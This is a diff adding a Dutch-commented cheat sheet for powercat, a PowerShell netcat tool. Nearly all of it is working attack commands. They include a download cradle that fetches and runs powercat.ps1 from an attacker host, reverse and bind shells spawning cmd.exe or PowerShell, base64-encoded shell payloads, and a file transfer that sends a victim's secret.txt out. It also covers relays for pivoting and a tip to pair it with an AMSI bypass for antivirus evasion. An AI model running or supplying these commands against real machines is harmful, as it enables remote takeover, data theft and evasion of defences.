@@ -1,0 +1,44 @@
+# Powercat - PowerShell netcat (reverse/bind shells + file transfer)
+# === Download powercat ===
+# In-memory laden:
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')
+# Of lokaal:
+. .\powercat.ps1
+# === Reverse shell ===
+# Listener (aanvaller):
+nc -nlvp 443
+# Target:
+powercat -c ATTACKER_IP -p 443 -e cmd.exe
+# Met PowerShell:
+powercat -c ATTACKER_IP -p 443 -ep
+# === Bind shell ===
+# Target (listener):
+powercat -l -p 4444 -e cmd.exe
+# Aanvaller:
+nc TARGET_IP 4444
+# === Encoded payload (base64 voor one-liner) ===
+# Genereer encoded payload:
+powercat -c ATTACKER_IP -p 443 -e cmd.exe -ge > encoded_shell.ps1
+# Uitvoeren:
+powershell -E <BASE64_STRING>
+# === File transfer ===
+# Ontvanger (aanvaller):
+nc -nlvp 443 > received_file
+# Verzender (target):
+powercat -c ATTACKER_IP -p 443 -i C:\Users\victim\secret.txt
+# === Relay / Pivot ===
+# Relay van poort 8080 naar intern target:
+powercat -l -p 8080 -r tcp:INTERNAL_TARGET:80
+# DNS relay:
+powercat -l -p 53 -r dns:ATTACKER_IP:443
+# === Eenvoudige download cradle + shell ===
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 443 -e cmd.exe"
+# === Powercat via base64 one-liner ===
+# Op aanvaller genereren:
+pwsh -c "& { Import-Module ./powercat.ps1; powercat -c ATTACKER_IP -p 443 -e cmd.exe -ge }" > payload.txt
+# Op target uitvoeren:
+powershell -E <inhoud van payload.txt>
+# Tip: powercat.ps1 = pure PowerShell, geen binaries nodig
+# Tip: -ge flag genereert base64 encoded versie
+# Tip: -ep flag start PowerShell ipv cmd.exe
+# Tip: Combineer met AMSI bypass voor AV evasion
